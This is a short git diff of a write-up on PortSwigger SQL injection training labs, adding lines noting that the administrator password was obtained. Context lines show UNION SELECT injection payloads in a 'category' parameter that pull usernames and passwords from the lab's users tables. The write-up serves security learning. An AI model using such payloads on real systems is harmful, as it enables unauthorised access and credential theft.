@@ -98,6 +98,7 @@ category=' union select username_cluojr, password_fkpkqk from users_vlfwzh--
 
 ![lab9.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab9.png)
 
+- We got the administrator password, and we can log in with it. 
 -----------------------------------------------------------------------
 
 ### Lab10: SQL injection attack, listing the database contents on Oracle
@@ -130,6 +131,6 @@ category=' union select USERNAME_EXOKDN, PASSWORD_YEICFS from USERS_ZXHNHP--
 ```
 
 ![lab10.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab10.png)
-
+- Nice, we got the administrator password.
 
 ![I got you](https://c.tenor.com/gJto5WLSSVEAAAAC/the-batman-penguin.gif)
